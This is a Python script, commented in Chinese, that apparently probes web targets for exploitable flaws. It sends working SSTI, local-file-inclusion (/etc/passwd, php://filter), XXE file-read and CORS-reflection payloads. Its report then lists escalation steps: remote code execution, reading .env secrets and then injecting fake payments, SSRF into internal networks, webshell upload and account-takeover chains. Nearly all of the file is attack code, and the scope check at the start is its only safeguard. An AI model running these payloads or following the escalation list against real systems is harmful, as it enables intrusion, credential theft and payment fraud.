#!/usr/bin/env python3
"""核心 Web 漏洞面探针（授权范围内）。

L1：CORS / 会话 Cookie 无 SameSite / 上传入口 / 重置入口 / PHP 序列化 Cookie。
L2：SSTI 稀有算术差分、LFI 读文件、XXE 实体回显。
不上传 WebShell、不发 SSTI/XXE RCE gadget。
"""
from __future__ import annotations

import argparse
import base64
import json
import re
import sys
from datetime import datetime, UTC
from pathlib import Path
from typing import Any
from urllib.parse import quote, urljoin

try:
    import requests

    requests.packages.urllib3.disable_warnings()  # type: ignore
except ImportError:
    print("[!] pip install requests", file=sys.stderr)
    sys.exit(1)

OPS = Path(__file__).resolve().parent
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))
from scope_lib import host_of, in_scope, write_probe_json  # noqa: E402

UA = "Mozilla/5.0 大爱仙尊-core-web"
EVIL_ORIGIN = "https://evil.daaixianzun.test"
SSTI_A, SSTI_B = 9359, 10696  # 1337*7 / 1337*8，避免页面里的 49/56
PASSWD_RX = re.compile(r"root:[x*]:0:0:")
SERIAL_RX = re.compile(rb'(?:O:\d+:"|a:\d+:\{|C:\d+:")')
SESSION_CK = re.compile(
    r"(phpsessid|jsessionid|session(?:id)?|laravel_session|remember(?:_web)?|token|sid|jwt)=",
    re.I,
)
XML_ERR_RX = re.compile(
    r"(?:SAXParse|XMLStream|Undeclared entity|external entity|EntityRef|"
    r"DOCTYPE is disallowed|XML document structures|not well-formed|"
    r"SimpleXML|libxml|Document parse error)",
    re.I,
)
FILE_INPUT_RX = re.compile(r'<input[^>]+type=["\']file["\']', re.I)
RESET_HINT_RX = re.compile(r"forgot|reset.?password|找回密码|忘记密码|重置密码", re.I)


def _params(fast: bool, full: tuple[str, ...], short: tuple[str, ...]) -> tuple[str, ...]:
    return short if fast else full


def _req(sess: requests.Session, method: str, url: str, **kw: Any) -> requests.Response | None:
    kw.setdefault("timeout", 4)
    kw.setdefault("verify", False)
    kw.setdefault("allow_redirects", False)
    try:
        return sess.request(method, url, **kw)
    except Exception:
        return None


def _text(r: requests.Response | None) -> str:
    if r is None:
        return ""
    return r.text or ""


def _set_cookie_blob(r: requests.Response) -> str:
    raw = getattr(getattr(r, "raw", None), "headers", None)
    if raw is not None and hasattr(raw, "get_all"):
        parts = raw.get_all("Set-Cookie") or []
        if parts:
            return "\n".join(parts)
    return r.headers.get("Set-Cookie", "")


def _probe_cors(sess: requests.Session, base: str) -> list[dict[str, Any]]:
    hits: list[dict[str, Any]] = []
    for origin in (EVIL_ORIGIN, "null"):
        for path in ("/", "/api/", "/api/user"):
            r = _req(sess, "GET", urljoin(base + "/", path.lstrip("/")), headers={"Origin": origin})
            if r is None:
                continue
            acao = r.headers.get("Access-Control-Allow-Origin", "")
            cred = r.headers.get("Access-Control-Allow-Credentials", "")
            if acao not in (origin, "*"):
                continue
            lvl = "L2" if (acao == origin and cred.lower() == "true") else "L1"
            hits.append(
                {
                    "family": "cors",
                    "level": lvl,
                    "path": path,
                    "origin": origin,
                    "acao": acao,
                    "credentials": cred,
                    "signal": "cors-reflect-cred" if lvl == "L2" else "cors-open",
                }
            )
            return hits
    return hits


def _probe_csrf(sess: requests.Session, r0: requests.Response | None) -> list[dict[str, Any]]:
    if r0 is None:
        return []
    set_c = _set_cookie_blob(r0)
    body = _text(r0)
    sessionish = bool(SESSION_CK.search(set_c))
    weak_samesite = sessionish and "samesite=strict" not in set_c.lower() and "samesite=lax" not in set_c.lower()
    has_form = "<form" in body.lower()
    has_token = bool(re.search(r'name=["\'](?:_token|csrf|_csrf|csrfmiddlewaretoken|__RequestVerificationToken)', body, re.I))
    if not (weak_samesite or (has_form and not has_token)):
        return []
    return [
        {
            "family": "csrf",
            "level": "L1",
            "signal": "session-cookie-no-samesite" if weak_samesite else "form-no-csrf-token",
            "has_form": has_form,
            "has_token": has_token,
        }
    ]


def _probe_ssti(sess: requests.Session, base: str, fast: bool) -> list[dict[str, Any]]:
    params = _params(fast, ("name", "q", "search", "template", "preview", "msg"), ("name", "q", "template"))
    pairs = (
        (f"{{{{{1337}*7}}}}", f"{{{{{1337}*8}}}}"),
        (f"${{{1337}*7}}", f"${{{1337}*8}}"),
    )
    base_r = _req(sess, "GET", base + "/")
    base_t = _text(base_r)
    if str(SSTI_A) in base_t or str(SSTI_B) in base_t:
        return []
    for param in params:
        for p_hit, p_miss in pairs:
            url = f"{base}/?{param}="
            a = _req(sess, "GET", url + quote(p_hit, safe=""))
            b = _req(sess, "GET", url + quote(p_miss, safe=""))
            ta, tb = _text(a), _text(b)
            if not ta or not tb:
                continue
            if str(SSTI_A) in ta and str(SSTI_B) in tb and str(SSTI_A) not in tb and str(SSTI_B) not in ta:
                return [
                    {
                        "family": "ssti",
                        "level": "L2",
                        "signal": "ssti-arith",
                        "param": param,
                        "engine_hint": "jinja/twig" if p_hit.startswith("{{") else "freemarker/velocity",
                    }
                ]
    return []


def _php_filter_hit(body: str) -> bool:
    compact = re.sub(r"\s+", "", body)
    m = re.search(r"((?:PD9waH|PD9QSFA)[A-Za-z0-9+/=]{8,})", compact)
    if not m:
        return False
    blob = m.group(1)
    pad = (-len(blob)) % 4
    try:
        dec = base64.b64decode(blob + ("=" * pad))
    except Exception:
        return False
    return dec.startswith(b"<?php") or dec.startswith(b"<?PHP") or b"<?php" in dec[:200]


def _probe_lfi(sess: requests.Session, base: str, fast: bool) -> list[dict[str, Any]]:
    params = _params(fast, ("file", "page", "path", "include", "template", "lang", "view"), ("file", "page", "path"))
    payloads = (
        "../../../../../../etc/passwd",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/convert.base64-encode/resource=../index.php",
    )
    if fast:
        payloads = payloads[:2]
    for param in params:
        for pay in payloads:
            r = _req(sess, "GET", f"{base}/?{param}={quote(pay, safe='')}")
            body = _text(r)
            if PASSWD_RX.search(body):
                return [{"family": "lfi", "level": "L2", "signal": "lfi-passwd", "param": param}]
            if "php://filter" in pay and _php_filter_hit(body):
                return [{"family": "lfi", "level": "L2", "signal": "lfi-php-filter", "param": param}]
    return []


def _probe_xxe(sess: requests.Session, base: str, fast: bool) -> list[dict[str, Any]]:
    xml = (
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        "<r>&xxe;</r>"
    )
    headers = {"Content-Type": "application/xml"}
    paths = (("/api", "/xml", "/soap") if fast else ("/api", "/xml", "/soap", "/import", "/parse", "/api/import"))
    for path in paths:
        r = _req(sess, "POST", urljoin(base + "/", path.lstrip("/")), data=xml.encode("utf-8"), headers=headers)
        body = _text(r)
        if PASSWD_RX.search(body):
            return [{"family": "xxe", "level": "L2", "signal": "xxe-file-read", "path": path}]
        if r is None:
            continue
        ctype = (r.headers.get("Content-Type") or "").lower()
        looks_xml = "xml" in ctype or body.lstrip().startswith("<?xml")
        if looks_xml and XML_ERR_RX.search(body):
            return [
                {
                    "family": "xxe",
                    "level": "L1",
                    "signal": "xxe-parser-error",
                    "path": path,
                    "status": r.status_code,
                }
            ]
    return []


def _probe_upload(sess: requests.Session, base: str, fast: bool) -> list[dict[str, Any]]:
    paths = (("/upload", "/api/upload") if fast else ("/upload", "/upload.php", "/api/upload", "/admin/upload", "/common/upload"))
    hits: list[dict[str, Any]] = []
    for path in paths:
        r = _req(sess, "GET", urljoin(base + "/", path.lstrip("/")), allow_redirects=True)
        if r is None or r.status_code >= 400:
            continue
        body = _text(r)
        if FILE_INPUT_RX.search(body) or "multipart/form-data" in body.lower():
            hits.append({"family": "upload", "level": "L1", "signal": "upload-form", "path": path, "status": r.status_code})
    return hits[:3]


def _probe_reset(sess: requests.Session, base: str, fast: bool) -> list[dict[str, Any]]:
    paths = (("/forgot", "/password/reset") if fast else ("/forgot", "/forgot-password", "/password/reset", "/user/forgot"))
    hits: list[dict[str, Any]] = []
    for path in paths:
        r = _req(sess, "GET", urljoin(base + "/", path.lstrip("/")), allow_redirects=True)
        if r is None or r.status_code >= 400:
            continue
        if RESET_HINT_RX.search(_text(r)):
            hits.append({"family": "reset", "level": "L1", "signal": "reset-form", "path": path, "status": r.status_code})
    return hits[:3]


def _probe_serialize(r0: requests.Response | None) -> list[dict[str, Any]]:
    if r0 is None:
        return []
    raw = _set_cookie_blob(r0).encode("latin1", errors="ignore")
    if SERIAL_RX.search(raw):
        return [{"family": "php-unserialize", "level": "L1", "signal": "serialize-cookie"}]
    return []


def _probe_stack_handoff(r0: requests.Response | None) -> list[dict[str, Any]]:
    """首页指纹交接猎面卡，不在本层打 Next/ASP.NET。"""
    if r0 is None:
        return []
    blob = (_text(r0) + " " + " ".join(f"{k}:{v}" for k, v in r0.headers.items())).lower()
    hits: list[dict[str, Any]] = []
    rules = (
        (("__next_data__", "x-nextjs", "/_next/static", "next-action"),
         "nextjs", "python3 炼蛊房/nextjs_surface_probe.py --base {base} --case <案>"),
        (("__viewstate", "x-aspnet", ".aspxauth"),
         "aspnet", "python3 炼蛊房/aspnet_surface_probe.py --base {base} --case <案>"),
        (("grpc-status", "application/grpc"),
         "grpc", "python3 炼蛊房/grpc_surface_probe.py --base {base} --case <案>"),
    )
    for needles, signal, nxt in rules:
        if any(n in blob for n in needles):
            hits.append({
                "family": "stack-handoff",
                "level": "L1",
                "signal": signal,
                "next": nxt,
            })
    return hits


def run(base_url: str, case: str, out: Path | None, fast: bool = False) -> dict[str, Any]:
    host = host_of(base_url)
    if host and not in_scope(host):
        print(f"[!] 不在 scope：{host}", file=sys.stderr)
        sys.exit(2)
    base = base_url.rstrip("/")
    sess = requests.Session()
    sess.verify = False
    sess.headers["User-Agent"] = UA
    r0 = _req(sess, "GET", base + "/")

    findings: list[dict[str, Any]] = []
    findings.extend(_probe_stack_handoff(r0))
    findings.extend(_probe_cors(sess, base))
    findings.extend(_probe_csrf(sess, r0))
    findings.extend(_probe_ssti(sess, base, fast))
    findings.extend(_probe_lfi(sess, base, fast))
    findings.extend(_probe_xxe(sess, base, fast))
    findings.extend(_probe_upload(sess, base, fast))
    findings.extend(_probe_reset(sess, base, fast))
    findings.extend(_probe_serialize(r0))

    l2 = [f for f in findings if f.get("level") == "L2"]
    report: dict[str, Any] = {
        "ts": datetime.now(UTC).isoformat(),
        "target": base,
        "host": host,
        "fast": fast,
        "findings": findings,
        "l2_hits": len(l2),
        "playbook": "传承/薄青·岁岁索命.md",
        "skill": "杀招/薄青·伤匣",
        "next": [
            "SSTI L2 → tpl_inject_probe.py ssti --exec（授权内 RCE 直接做）",
            "LFI L2 → tpl_inject_probe.py lfi；读 .env 后回灌假支付",
            "XXE L2 → tpl_inject_probe.py xxe；再 ssrf_probe 打内网",
            "CORS L2 → cors_csrf_probe.py cors；wp-json 走 wp-rest-cors-ato",
            "CSRF L1 → cors_csrf_probe.py csrf --post 状态改变接口",
            "上传入口 → Skill file-upload-webshell（默认只传 marker）",
            "重置入口 → Skill account-takeover-chain",
            "PHP 序列化 Cookie → 传承/化形.md",
            "Next.js 指纹 → nextjs_surface_probe.py；NEXTAUTH 先 tg-bot-nextauth-takeover",
            "ASP.NET 指纹 → aspnet_surface_probe.py；SharePoint 先 sharepoint-unauth-rce",
            "gRPC 指纹 → grpc_surface_probe.py（禁止 Rapid Reset）",
        ],
    }
    out_path = write_probe_json(
        report, case=case, out=out, case_subdir="core_web", filename="surface.json"
    )
    print(json.dumps({"findings": len(findings), "l2": len(l2), "fast": fast, "out": str(out_path)}, ensure_ascii=False))
    return report


def main() -> None:
    ap = argparse.ArgumentParser(description="核心 Web 漏洞面探针")
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("--case", default="")
    ap.add_argument("--out", type=Path, default=None)
    ap.add_argument("--fast", action="store_true", help="少参数，给 kit_run 用")
    args = ap.parse_args()
    run(args.url, args.case, args.out, args.fast)


if __name__ == "__main__":
    main()
